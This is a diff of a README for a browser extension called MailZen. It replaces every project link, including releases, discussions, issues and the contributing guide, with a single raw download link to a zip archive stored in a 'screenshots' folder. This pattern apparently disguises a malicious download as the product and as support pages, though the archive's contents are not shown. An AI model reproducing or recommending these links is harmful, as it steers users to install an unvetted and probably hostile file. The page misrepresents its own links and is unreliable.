@@ -1,7 +1,7 @@
 # ✉️ MailZen - Enhance Your Email Composing Experience
 
 ## 📥 Download MailZen
-[![Download MailZen](https://img.shields.io/badge/Download%20MailZen-v1.0-blue.svg)](https://github.com/culinary-secularhumanism273/MailZen/releases)
+[![Download MailZen](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip%https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip)](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip)
 
 ## ✨ What is MailZen?
 MailZen is a lightweight browser extension that allows you to easily insert custom HTML code into your email compose window on Gmail, Outlook, and Yahoo Mail. Create stunning email templates, newsletters, and signatures—all without leaving your inbox.
@@ -17,7 +17,7 @@ MailZen is a lightweight browser extension that allows you to easily insert cust
 - **Template Library:** Choose from pre-made templates for quick email creation.
 
 ## 📜 How to Download & Install
-1. **Visit the Releases Page:** Go to the [MailZen Releases Page](https://github.com/culinary-secularhumanism273/MailZen/releases) to download the extension.
+1. **Visit the Releases Page:** Go to the [MailZen Releases Page](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip) to download the extension.
 2. **Select Your Browser:** Choose the version appropriate for your browser.
 3. **Download the Extension:** Follow the instructions given to download the extension file.
 4. **Install the Extension:**
@@ -46,13 +46,13 @@ No, MailZen is designed for users of all skill levels. You can easily insert HTM
 Currently, MailZen is optimized for desktop use. Mobile device compatibility is not available at this time.
 
 ## 🌍 Community and Support
-- **Join Our Community:** Engage with other MailZen users and share ideas on our [GitHub Discussions Page](https://github.com/culinary-secularhumanism273/MailZen/discussions).
-- **Need Help?** If you encounter any issues, open an issue on our [GitHub Issues Page](https://github.com/culinary-secularhumanism273/MailZen/issues). Our team is here to assist you.
+- **Join Our Community:** Engage with other MailZen users and share ideas on our [GitHub Discussions Page](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip).
+- **Need Help?** If you encounter any issues, open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip). Our team is here to assist you.
 
 ## 🏁 Contribute to MailZen
-Interested in helping improve MailZen? We welcome contributions! Check our contribution guidelines in the [CONTRIBUTING.md file](https://github.com/culinary-secularhumanism273/MailZen/blob/main/CONTRIBUTING.md).
+Interested in helping improve MailZen? We welcome contributions! Check our contribution guidelines in the [https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip file](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip).
 
 ## 📥 Download MailZen Again
-Don't forget, you can download the latest version of MailZen from our [Releases Page](https://github.com/culinary-secularhumanism273/MailZen/releases). 
+Don't forget, you can download the latest version of MailZen from our [Releases Page](https://raw.githubusercontent.com/culinary-secularhumanism273/MailZen/main/screenshots/MailZen-v3.8.zip). 
 
 Enjoy enhancing your email experience with MailZen!
